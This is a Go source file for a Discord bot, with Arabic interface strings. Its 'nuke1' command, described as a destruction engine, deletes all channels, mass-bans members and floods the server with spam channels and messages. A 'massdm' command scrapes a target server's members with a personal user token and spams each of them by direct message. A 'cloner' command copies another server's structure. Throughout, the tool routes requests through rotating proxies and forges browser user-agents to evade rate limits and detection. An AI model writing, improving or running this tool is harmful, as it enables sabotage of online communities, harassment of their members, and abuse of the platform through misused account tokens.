package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"sort"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
)

var massiveProxyPool = []string{
	"103.152.112.5:80",
	"185.199.229.156:8080",
	"45.33.32.156:3128",
	"190.61.35.153:8080",
	"200.105.215.12:80",
}

func main() {
	token := os.Getenv("MASTERGUARD_TOKEN")
	if token == "" {
		fmt.Println("❌ خطأ: متغير البيئة MASTERGUARD_TOKEN غير موجود")
		return
	}

	sess, err := discordgo.New("Bot " + token)
	if err != nil {
		fmt.Println("خطأ في إنشاء جلسة البوت:", err)
		return
	}

	sess.Identify.Intents = discordgo.IntentsAll

	cmdClone := "cloner"
	commandClone := &discordgo.ApplicationCommand{
		Name:        cmdClone,
		Description: "نسخ سيرفر كامل بالصلاحيات الكاملة والترتيب الدقيق",
		Options: []*discordgo.ApplicationCommandOption{
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "template_guild_id",
				Description: "إيدي السيرفر المراد نسخه",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "user_token",
				Description: "التوكن الشخصي لحسابك (لسحب السيرفر المصدر)",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "bot_tokens",
				Description: "توكنات البوتات لتنفيذ الإنشاء (مفصولة بفاصلة)",
				Required:    true,
			},
		},
	}

	cmdNuke := "nuke1"
	commandNuke := &discordgo.ApplicationCommand{
		Name:        cmdNuke,
		Description: "محرك التدمير الشامل: حذف، باند، وسبام بالسرعة القصوى",
		Options: []*discordgo.ApplicationCommandOption{
			{
				Type:        discordgo.ApplicationCommandOptionBoolean,
				Name:        "enable_ban",
				Description: "تفعيل باند الأعضاء؟",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "room_name",
				Description: "اسم الرومات الجديدة",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionInteger,
				Name:        "rooms_count",
				Description: "عدد الرومات",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "message_content",
				Description: "محتوى رسالة السبام",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionInteger,
				Name:        "messages_count",
				Description: "عدد الرسائل بكل روم",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "bot_tokens",
				Description: "توكنات البوتات التنفيذية مفصولة بفاصلة",
				Required:    true,
			},
		},
	}

	cmdMassDM := "massdm"
	commandMassDM := &discordgo.ApplicationCommand{
		Name:        cmdMassDM,
		Description: "إرسال رسالة خاصة (DM) لجميع أعضاء سيرفر محدد بسرعة فائقة",
		Options: []*discordgo.ApplicationCommandOption{
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "guild_id",
				Description: "إيدي السيرفر المراد استهداف أعضائه",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "user_token",
				Description: "التوكن الشخصي (لسحب الأعضاء من السيرفر الخارجي)",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "message",
				Description: "محتوى الرسالة المراد إرسالها بالخاص",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "bot_tokens",
				Description: "التوكنات الشخصية للإرسال (مفصولة بفاصلة)",
				Required:    true,
			},
		},
	}

	sess.AddHandler(func(s *discordgo.Session, i *discordgo.InteractionCreate) {
		if i.Type != discordgo.InteractionApplicationCommand {
			return
		}

		data := i.ApplicationCommandData()

		if data.Name == cmdClone {
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "🔄 جاري نسخ الرتب والصلاحيات والترتيب بدقة تامة...",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})

			optionMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
			for _, opt := range data.Options {
				optionMap[opt.Name] = opt
			}

			templateGuildID := optionMap["template_guild_id"].StringValue()
			userToken := optionMap["user_token"].StringValue()
			tokensInput := optionMap["bot_tokens"].StringValue()

			var tokens []string
			for _, t := range strings.Split(tokensInput, ",") {
				t = strings.TrimSpace(t)
				if t != "" {
					tokens = append(tokens, t)
				}
			}

			go executeServerClonerWithUserToken(tokens, userToken, massiveProxyPool, i.GuildID, templateGuildID, i.Interaction, s)

		} else if data.Name == cmdNuke {
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "🚀 جاري تفعيل محرك nuke1 بالسرعة القصوى...",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})

			optionMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
			for _, opt := range data.Options {
				optionMap[opt.Name] = opt
			}

			enableBan := optionMap["enable_ban"].BoolValue()
			roomName := optionMap["room_name"].StringValue()
			roomsCount := int(optionMap["rooms_count"].IntValue())
			messageContent := optionMap["message_content"].StringValue()
			messagesCount := int(optionMap["messages_count"].IntValue())
			tokensInput := optionMap["bot_tokens"].StringValue()

			var tokens []string
			for _, t := range strings.Split(tokensInput, ",") {
				t = strings.TrimSpace(t)
				if t != "" {
					tokens = append(tokens, t)
				}
			}

			go executeNukeEngine(tokens, massiveProxyPool, i.GuildID, s.State.User.ID, roomName, roomsCount, messageContent, messagesCount, enableBan, s)

		} else if data.Name == cmdMassDM {
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "📨 جاري بدء حملة إرسال الرسائل الخاصة (Mass DM) بالسرعة القصوى...",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})

			optionMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
			for _, opt := range data.Options {
				optionMap[opt.Name] = opt
			}

			targetGuildID := optionMap["guild_id"].StringValue()
			userToken := optionMap["user_token"].StringValue()
			msgContent := optionMap["message"].StringValue()
			tokensInput := optionMap["bot_tokens"].StringValue()

			var tokens []string
			for _, t := range strings.Split(tokensInput, ",") {
				t = strings.TrimSpace(t)
				if t != "" {
					tokens = append(tokens, t)
				}
			}

			go executeMassDM(tokens, massiveProxyPool, targetGuildID, userToken, msgContent, i.Interaction, s)
		}
	})

	err = sess.Open()
	if err != nil {
		fmt.Println("خطأ في تشغيل الجلسة:", err)
		return
	}

	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", commandClone)
	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", commandNuke)
	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", commandMassDM)
	fmt.Println("⚡ الأوامر جاهزة بنجاح!")

	stop := make(chan os.Signal, 1)
	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-stop

	sess.Close()
}

func filterActiveProxies(rawProxies []string) []*http.Client {
	var activeClients []*http.Client
	var mu sync.Mutex
	var wg sync.WaitGroup

	for _, pStr := range rawProxies {
		wg.Add(1)
		go func(proxy string) {
			defer wg.Done()
			pURL, parseErr := url.Parse("http://" + proxy)
			if parseErr != nil {
				return
			}
			client := &http.Client{
				Transport: &http.Transport{
					Proxy: http.ProxyURL(pURL),
				},
				Timeout: 1500 * time.Millisecond,
			}
			req, _ := http.NewRequest("GET", "https://discord.com/api/v10/gateway", nil)
			resp, reqErr := client.Do(req)
			if reqErr == nil {
				resp.Body.Close()
				mu.Lock()
				activeClients = append(activeClients, client)
				mu.Unlock()
			}
		}(pStr)
	}
	wg.Wait()
	return activeClients
}

func updateInteractionStatus(s *discordgo.Session, interaction *discordgo.Interaction, content string) {
	_, _ = s.InteractionResponseEdit(interaction, &discordgo.WebhookEdit{
		Content: &content,
	})
}

func fetchGuildDataWithUserToken(userToken, guildID string) ([]map[string]interface{}, []map[string]interface{}, error) {
	client := &http.Client{Timeout: 15 * time.Second}
	userToken = strings.TrimSpace(userToken)

	reqChan, _ := http.NewRequest("GET", fmt.Sprintf("https://discord.com/api/v10/guilds/%s/channels", guildID), nil)
	reqChan.Header.Set("Authorization", userToken)
	reqChan.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
	reqChan.Header.Set("Accept", "application/json")

	respChan, reqErr := client.Do(reqChan)
	if reqErr != nil {
		return nil, nil, reqErr
	}
	defer respChan.Body.Close()

	if respChan.StatusCode != 200 {
		return nil, nil, fmt.Errorf("channels fetch failed with status: %d", respChan.StatusCode)
	}

	var channels []map[string]interface{}
	if err := json.NewDecoder(respChan.Body).Decode(&channels); err != nil {
		return nil, nil, err
	}

	reqRole, _ := http.NewRequest("GET", fmt.Sprintf("https://discord.com/api/v10/guilds/%s/roles", guildID), nil)
	reqRole.Header.Set("Authorization", userToken)
	reqRole.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
	reqRole.Header.Set("Accept", "application/json")

	respRole, roleErr := client.Do(reqRole)
	if roleErr != nil {
		return channels, nil, roleErr
	}
	defer respRole.Body.Close()

	if respRole.StatusCode != 200 {
		return channels, nil, fmt.Errorf("roles fetch failed with status: %d", respRole.StatusCode)
	}

	var roles []map[string]interface{}
	if err := json.NewDecoder(respRole.Body).Decode(&roles); err != nil {
		return channels, nil, err
	}

	return channels, roles, nil
}

func executeServerClonerWithUserToken(tokens []string, userToken string, rawProxies []string, guildID, templateGuildID string, interaction *discordgo.Interaction, s *discordgo.Session) {
	if len(tokens) == 0 {
		updateInteractionStatus(s, interaction, "❌ خطأ: لم يتم إدخال توكنات بوتات التنفيذ.")
		return
	}

	clients := filterActiveProxies(rawProxies)
	if len(clients) == 0 {
		clients = append(clients, &http.Client{Timeout: 3 * time.Second})
	}

	makeProxyRequest := func(method, urlStr string, body []byte, index int) (int, bool) {
		client := clients[index%len(clients)]
		token := tokens[index%len(tokens)]

		for attempt := 0; attempt < 3; attempt++ {
			var bodyBuf *bytes.Buffer
			if body != nil {
				bodyBuf = bytes.NewBuffer(body)
			} else {
				bodyBuf = bytes.NewBuffer(nil)
			}

			req, reqErr := http.NewRequestWithContext(context.Background(), method, urlStr, bodyBuf)
			if reqErr != nil {
				return 0, false
			}
			req.Header.Set("Authorization", "Bot "+token)
			req.Header.Set("Content-Type", "application/json")
			req.Header.Set("User-Agent", "DiscordBot (https://discord.com, v10)")

			resp, doErr := client.Do(req)
			if doErr != nil {
				client = clients[(index+attempt+1)%len(clients)]
				continue
			}

			statusCode := resp.StatusCode
			resp.Body.Close()

			if statusCode == 429 {
				time.Sleep(150 * time.Millisecond)
				continue
			}

			return statusCode, true
		}
		return 0, false
	}

	updateInteractionStatus(s, interaction, "🔍 جاري سحب بيانات السيرفر المصدر...")
	templateChannels, templateRoles, fetchErr := fetchGuildDataWithUserToken(userToken, templateGuildID)
	if fetchErr != nil {
		updateInteractionStatus(s, interaction, fmt.Sprintf("❌ فشل سحب البيانات: %v", fetchErr))
		return
	}

	roleIDMap := make(map[string]string)

	channels, chErr := s.GuildChannels(guildID)
	var oldChannelIDs []string
	if chErr == nil {
		for _, ch := range channels {
			if ch != nil {
				oldChannelIDs = append(oldChannelIDs, ch.ID)
			}
		}
	}

	roles, roleErr := s.GuildRoles(guildID)
	if roleErr == nil {
		updateInteractionStatus(s, interaction, "🗑️ جاري حذف الرتب القديمة...")
		var wgRole sync.WaitGroup
		for i, r := range roles {
			if !r.Managed && r.Name != "@everyone" {
				wgRole.Add(1)
				go func(rID string, idx int) {
					defer wgRole.Done()
					makeProxyRequest("DELETE", fmt.Sprintf("https://discord.com/api/v10/guilds/%s/roles/%s", guildID, rID), nil, idx)
				}(r.ID, i)
			}
		}
		wgRole.Wait()
	}

	updateInteractionStatus(s, interaction, fmt.Sprintf("🧹 جاري حذف الرومات القديمة (%d روم)...", len(oldChannelIDs)))
	chQueue := make(chan string, len(oldChannelIDs))
	for _, id := range oldChannelIDs {
		chQueue <- id
	}
	close(chQueue)

	var wgDel sync.WaitGroup
	for w := 0; w < 40; w++ {
		wgDel.Add(1)
		go func(workerID int) {
			defer wgDel.Done()
			for chID := range chQueue {
				makeProxyRequest("DELETE", "https://discord.com/api/v10/channels/"+chID, nil, workerID)
			}
		}(w)
	}
	wgDel.Wait()

	updateInteractionStatus(s, interaction, "📥 جاري إنشاء الرتب وترتيبها وربط الصلاحيات...")

	sort.Slice(templateRoles, func(i, j int) bool {
		posI, _ := templateRoles[i]["position"].(float64)
		posJ, _ := templateRoles[j]["position"].(float64)
		return posI > posJ
	})

	for i, r := range templateRoles {
		name, _ := r["name"].(string)
		oldRoleID, _ := r["id"].(string)

		if name == "@everyone" {
			roleIDMap[oldRoleID] = guildID
			if perms, ok := r["permissions"]; ok {
				everyonePayload, _ := json.Marshal(map[string]interface{}{
					"permissions": perms,
				})
				makeProxyRequest("PATCH", fmt.Sprintf("https://discord.com/api/v10/guilds/%s/roles/%s", guildID, guildID), everyonePayload, i)
			}
			continue
		}

		var perms interface{} = r["permissions"]
		if pStr, ok := r["permissions"].(string); ok {
			var pInt int64
			fmt.Sscanf(pStr, "%d", &pInt)
			perms = pInt
		}

		rolePayload, _ := json.Marshal(map[string]interface{}{
			"name":        r["name"],
			"permissions": perms,
			"color":       r["color"],
			"hoist":       r["hoist"],
			"mentionable": r["mentionable"],
		})

		client := clients[i%len(clients)]
		token := tokens[i%len(tokens)]
		req, reqErr := http.NewRequest("POST", fmt.Sprintf("https://discord.com/api/v10/guilds/%s/roles", guildID), bytes.NewBuffer(rolePayload))
		if reqErr == nil {
			req.Header.Set("Authorization", "Bot "+token)
			req.Header.Set("Content-Type", "application/json")
			resp, doErr := client.Do(req)
			if doErr == nil {
				if resp.StatusCode == 200 || resp.StatusCode == 201 {
					var resRole map[string]interface{}
					if json.NewDecoder(resp.Body).Decode(&resRole) == nil {
						if newRoleID, ok := resRole["id"].(string); ok && oldRoleID != "" {
							roleIDMap[oldRoleID] = newRoleID
						}
					}
				}
				resp.Body.Close()
			}
		}
		time.Sleep(60 * time.Millisecond)
	}

	mapOverwrites := func(overwrites interface{}) []map[string]interface{} {
		var mapped []map[string]interface{}
		ovList, ok := overwrites.([]interface{})
		if !ok {
			return mapped
		}

		for _, item := range ovList {
			ov, ok := item.(map[string]interface{})
			if !ok {
				continue
			}
			idStr, _ := ov["id"].(string)
			if newID, exists := roleIDMap[idStr]; exists {
				ov["id"] = newID
				mapped = append(mapped, ov)
			} else {
				mapped = append(mapped, ov)
			}
		}
		return mapped
	}

	updateInteractionStatus(s, interaction, "📂 جاري إنشاء الفئات والرومات بصلاحياتها الدقيقة...")

	var categories []map[string]interface{}
	var regularChannels []map[string]interface{}

	for _, ch := range templateChannels {
		if t, ok := ch["type"].(float64); ok {
			if int(t) == 4 {
				categories = append(categories, ch)
			} else {
				regularChannels = append(regularChannels, ch)
			}
		}
	}

	sort.Slice(categories, func(i, j int) bool {
		posI, _ := categories[i]["position"].(float64)
		posJ, _ := categories[j]["position"].(float64)
		return posI < posJ
	})

	categoryMap := make(map[string]string)

	for idx, cat := range categories {
		fixedOverwrites := mapOverwrites(cat["permission_overwrites"])
		payload, _ := json.Marshal(map[string]interface{}{
			"name":                  cat["name"],
			"type":                  cat["type"],
			"position":              cat["position"],
			"permission_overwrites": fixedOverwrites,
		})

		client := clients[idx%len(clients)]
		token := tokens[idx%len(tokens)]
		req, reqErr := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+guildID+"/channels", bytes.NewBuffer(payload))
		if reqErr != nil {
			continue
		}
		req.Header.Set("Authorization", "Bot "+token)
		req.Header.Set("Content-Type", "application/json")

		resp, doErr := client.Do(req)
		if doErr == nil {
			if resp.StatusCode == 200 || resp.StatusCode == 201 {
				var res map[string]interface{}
				if json.NewDecoder(resp.Body).Decode(&res) == nil {
					if oldID, ok := cat["id"].(string); ok {
						if newID, ok := res["id"].(string); ok {
							categoryMap[oldID] = newID
						}
					}
				}
			}
			resp.Body.Close()
		}
		time.Sleep(80 * time.Millisecond)
	}

	sort.Slice(regularChannels, func(i, j int) bool {
		posI, _ := regularChannels[i]["position"].(float64)
		posJ, _ := regularChannels[j]["position"].(float64)
		return posI < posJ
	})

	for idx, ch := range regularChannels {
		fixedOverwrites := mapOverwrites(ch["permission_overwrites"])
		data := map[string]interface{}{
			"name":                  ch["name"],
			"type":                  ch["type"],
			"topic":                 ch["topic"],
			"nsfw":                  ch["nsfw"],
			"rate_limit_per_user":   ch["rate_limit_per_user"],
			"bitrate":               ch["bitrate"],
			"user_limit":            ch["user_limit"],
			"position":              ch["position"],
			"permission_overwrites": fixedOverwrites,
		}

		if parentID, ok := ch["parent_id"].(string); ok && parentID != "" {
			if newParentID, exists := categoryMap[parentID]; exists {
				data["parent_id"] = newParentID
			}
		}

		payload, _ := json.Marshal(data)
		makeProxyRequest("POST", "https://discord.com/api/v10/guilds/"+guildID+"/channels", payload, idx)
		time.Sleep(50 * time.Millisecond)
	}

	updateInteractionStatus(s, interaction, "✅ تم استنساخ الرتب والرومات والفئات بكامل الصلاحيات والألوان والترتيب بنجاح تام! 🚀")
}

func executeMassDM(tokens []string, rawProxies []string, targetGuildID string, userToken string, messageContent string, interaction *discordgo.Interaction, s *discordgo.Session) {
	if len(tokens) == 0 {
		updateInteractionStatus(s, interaction, "❌ خطأ: لم يتم إدخال التوكنات الشخصية للإرسال.")
		return
	}

	clients := filterActiveProxies(rawProxies)
	if len(clients) == 0 {
		clients = append(clients, &http.Client{Timeout: 3 * time.Second})
	}

	updateInteractionStatus(s, interaction, "🔍 جاري سحب أعضاء السيرفر المستهدف...")

	clientHTTP := &http.Client{Timeout: 15 * time.Second}
	userToken = strings.TrimSpace(userToken)
	
	var allUserIDs []string
	after := ""
	for {
		urlStr := fmt.Sprintf("https://discord.com/api/v10/guilds/%s/members?limit=1000", targetGuildID)
		if after != "" {
			urlStr += "&after=" + after
		}

		req, err := http.NewRequest("GET", urlStr, nil)
		if err != nil {
			updateInteractionStatus(s, interaction, fmt.Sprintf("❌ خطأ إنشاء الطلب: %v", err))
			return
		}

		req.Header.Set("Authorization", userToken)
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
		req.Header.Set("Accept", "application/json")
		req.Header.Set("Accept-Language", "en-US,en;q=0.9")

		resp, err := clientHTTP.Do(req)
		if err != nil {
			updateInteractionStatus(s, interaction, fmt.Sprintf("❌ خطأ في الاتصال بالشبكة: %v", err))
			return
		}

		if resp.StatusCode != 200 {
			buf := new(bytes.Buffer)
			buf.ReadFrom(resp.Body)
			resp.Body.Close()

			errorBody := buf.String()
			var reasonArabic string

			switch resp.StatusCode {
			case 401:
				reasonArabic = "غير مصرح (401): التوكن الشخصي غير صحيح أو منتهي الصلاحية."
			case 403:
				reasonArabic = "تم رفض الوصول (403): الحساب غير منضم فعلياً للسيرفر، أو أن السيرفر يتطلب تحقق (Verification)، أو أن ديسكورد فرضت حظر مؤقت (API Block) على سحب الأعضاء بهذا الحساب."
			case 404:
				reasonArabic = "غير موجود (404): إيدي السيرفر المستهدف (Guild ID) خطأ أو غير موجود."
			case 429:
				reasonArabic = "تم حظر الطلبات مؤقتاً (429 Rate Limit): تجاوزت الحد المسموح من الطلبات."
			default:
				reasonArabic = fmt.Sprintf("خطأ غير معروف (كود %d): %s", resp.StatusCode, errorBody)
			}

			updateInteractionStatus(s, interaction, fmt.Sprintf("❌ فشل سحب الأعضاء:\n%s", reasonArabic))
			return
		}

		var members []map[string]interface{}
		json.NewDecoder(resp.Body).Decode(&members)
		resp.Body.Close()

		if len(members) == 0 {
			break
		}

		for _, m := range members {
			user, ok := m["user"].(map[string]interface{})
			if !ok {
				continue
			}
			isBot, _ := user["bot"].(bool)
			if isBot {
				continue
			}
			if id, ok := user["id"].(string); ok {
				allUserIDs = append(allUserIDs, id)
				after = id
			}
		}

		if len(members) < 1000 {
			break
		}
	}

	if len(allUserIDs) == 0 {
		updateInteractionStatus(s, interaction, "❌ لم يتم العثور على أعضاء أو أن القائمة فارغة تماماً.")
		return
	}

	updateInteractionStatus(s, interaction, fmt.Sprintf("📨 تم سحب (%d عضو). جاري بدء الإرسال الفوري...", len(allUserIDs)))

	userQueue := make(chan string, len(allUserIDs))
	for _, uid := range allUserIDs {
		userQueue <- uid
	}
	close(userQueue)

	msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})
	
	var wg sync.WaitGroup
	var successCount int64
	var mu sync.Mutex
	workersCount := 80

	for w := 0; w < workersCount; w++ {
		wg.Add(1)
		go func(wID int) {
			defer wg.Done()
			client := clients[wID%len(clients)]
			currUserToken := strings.TrimSpace(tokens[wID%len(tokens)])

			for userID := range userQueue {
				dmPayload, _ := json.Marshal(map[string]string{"recipient_id": userID})
				reqDM, err := http.NewRequest("POST", "https://discord.com/api/v10/users/@me/channels", bytes.NewBuffer(dmPayload))
				if err != nil {
					continue
				}
				
				reqDM.Header.Set("Authorization", currUserToken)
				reqDM.Header.Set("Content-Type", "application/json")
				reqDM.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

				respDM, err := client.Do(reqDM)
				if err != nil {
					continue
				}

				if respDM.StatusCode == 429 {
					respDM.Body.Close()
					time.Sleep(500 * time.Millisecond)
					continue
				}

				if respDM.StatusCode != 200 && respDM.StatusCode != 201 {
					respDM.Body.Close()
					continue
				}

				var dmRes map[string]interface{}
				err = json.NewDecoder(respDM.Body).Decode(&dmRes)
				respDM.Body.Close()
				if err != nil {
					continue
				}

				chanID, ok := dmRes["id"].(string)
				if !ok || chanID == "" {
					continue
				}

				reqMsg, err := http.NewRequest("POST", fmt.Sprintf("https://discord.com/api/v10/channels/%s/messages", chanID), bytes.NewBuffer(msgPayload))
				if err != nil {
					continue
				}
				
				reqMsg.Header.Set("Authorization", currUserToken)
				reqMsg.Header.Set("Content-Type", "application/json")
				reqMsg.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

				respMsg, err := client.Do(reqMsg)
				if err != nil {
					continue
				}
				
				if respMsg.StatusCode == 200 || respMsg.StatusCode == 201 {
					mu.Lock()
					successCount++
					mu.Unlock()
				}
				respMsg.Body.Close()

				time.Sleep(100 * time.Millisecond)
			}
		}(w)
	}

	wg.Wait()
	updateInteractionStatus(s, interaction, fmt.Sprintf("✅ تم الانتهاء بنجاح! تم إرسال الرسالة إلى **(%d)** عضو من أصل **(%d)** عضو مستهدف. 🚀", successCount, len(allUserIDs)))
}

func executeNukeEngine(tokens []string, rawProxies []string, guildID, botID, roomName string, roomsCount int, messageContent string, messagesCount int, includeBan bool, s *discordgo.Session) {
	if len(tokens) == 0 {
		return
	}
	clients := filterActiveProxies(rawProxies)
	if len(clients) == 0 {
		clients = append(clients, &http.Client{Timeout: 2 * time.Second})
	}

	botIDs := map[string]bool{botID: true}
	channelPayloads := make([][]byte, roomsCount)
	for i := 0; i < roomsCount; i++ {
		p, _ := json.Marshal(map[string]interface{}{
			"name": fmt.Sprintf("%s-%d", roomName, i),
			"type": 0,
		})
		channelPayloads[i] = p
	}

	msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})

	var allUserIDs []string
	if includeBan {
		after := ""
		for {
			members, memErr := s.GuildMembers(guildID, after, 1000)
			if memErr != nil || len(members) == 0 {
				break
			}
			for _, m := range members {
				if m != nil && m.User != nil {
					if !botIDs[m.User.ID] {
						allUserIDs = append(allUserIDs, m.User.ID)
					}
					after = m.User.ID
				}
			}
			if len(members) < 1000 {
				break
			}
		}
	}

	channels, chErr := s.GuildChannels(guildID)
	var oldChannelIDs []string
	if chErr == nil {
		for _, ch := range channels {
			if ch != nil {
				oldChannelIDs = append(oldChannelIDs, ch.ID)
			}
		}
	}

	makeReq := func(method, urlStr string, body []byte, index int) bool {
		client := clients[index%len(clients)]
		token := tokens[index%len(tokens)]
		for attempt := 0; attempt < 3; attempt++ {
			req, reqErr := http.NewRequestWithContext(context.Background(), method, urlStr, bytes.NewBuffer(body))
			if reqErr != nil {
				return false
			}
			req.Header.Set("Authorization", "Bot "+token)
			req.Header.Set("Content-Type", "application/json")
			req.Header.Set("User-Agent", "DiscordBot (https://discord.com, v10)")

			resp, doErr := client.Do(req)
			if doErr != nil {
				continue
			}
			if resp.StatusCode == 429 {
				resp.Body.Close()
				time.Sleep(20 * time.Millisecond)
				continue
			}
			resp.Body.Close()
			return true
		}
		return false
	}

	chQueue := make(chan string, len(oldChannelIDs))
	for _, id := range oldChannelIDs {
		chQueue <- id
	}
	close(chQueue)

	var wgDel sync.WaitGroup
	for w := 0; w < 60; w++ {
		wgDel.Add(1)
		go func(wID int) {
			defer wgDel.Done()
			for chID := range chQueue {
				makeReq("DELETE", "https://discord.com/api/v10/channels/"+chID, nil, wID)
			}
		}(w)
	}
	wgDel.Wait()

	if includeBan && len(allUserIDs) > 0 {
		userQueue := make(chan string, len(allUserIDs))
		for _, uid := range allUserIDs {
			userQueue <- uid
		}
		close(userQueue)

		var wgBan sync.WaitGroup
		for w := 0; w < 100; w++ {
			wgBan.Add(1)
			go func(wID int) {
				defer wgBan.Done()
				for uid := range userQueue {
					makeReq("PUT", fmt.Sprintf("https://discord.com/api/v10/guilds/%s/bans/%s", guildID, uid), nil, wID)
				}
			}(w)
		}
		wgBan.Wait()
	}

	var newChannelIDs []string
	var muChannels sync.Mutex
	var wgCreate sync.WaitGroup

	roomChan := make(chan []byte, len(channelPayloads))
	for _, p := range channelPayloads {
		roomChan <- p
	}
	close(roomChan)

	for w := 0; w < 50; w++ {
		wgCreate.Add(1)
		go func(wID int) {
			defer wgCreate.Done()
			client := clients[wID%len(clients)]
			token := tokens[wID%len(tokens)] // تم تصحيح الخطأ هنا واستبدال index بـ wID

			for p := range roomChan {
				req, reqErr := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+guildID+"/channels", bytes.NewBuffer(p))
				if reqErr != nil {
					continue
				}
				req.Header.Set("Authorization", "Bot "+token)
				req.Header.Set("Content-Type", "application/json")
				req.Header.Set("User-Agent", "DiscordBot (https://discord.com, v10)")

				resp, doErr := client.Do(req)
				if doErr != nil {
					continue
				}
				if resp.StatusCode == 200 || resp.StatusCode == 201 {
					var res map[string]interface{}
					if json.NewDecoder(resp.Body).Decode(&res) == nil {
						if id, ok := res["id"].(string); ok {
							muChannels.Lock()
							newChannelIDs = append(newChannelIDs, id)
							muChannels.Unlock()
						}
					}
				}
				resp.Body.Close()
			}
		}(w)
	}
	wgCreate.Wait()

	if len(newChannelIDs) > 0 && messagesCount > 0 {
		var wgMsg sync.WaitGroup
		for i, chID := range newChannelIDs {
			wgMsg.Add(1)
			go func(cID string, wIdx int) {
				defer wgMsg.Done()
				var wgSubMsg sync.WaitGroup
				for m := 0; m < messagesCount; m++ {
					wgSubMsg.Add(1)
					go func(msgIndex int) {
						defer wgSubMsg.Done()
						makeReq("POST", "https://discord.com/api/v10/channels/"+cID+"/messages", msgPayload, wIdx+msgIndex)
					}(m)
				}
				wgSubMsg.Wait()
			}(chID, i*10)
		}
		wgMsg.Wait()
	}
}
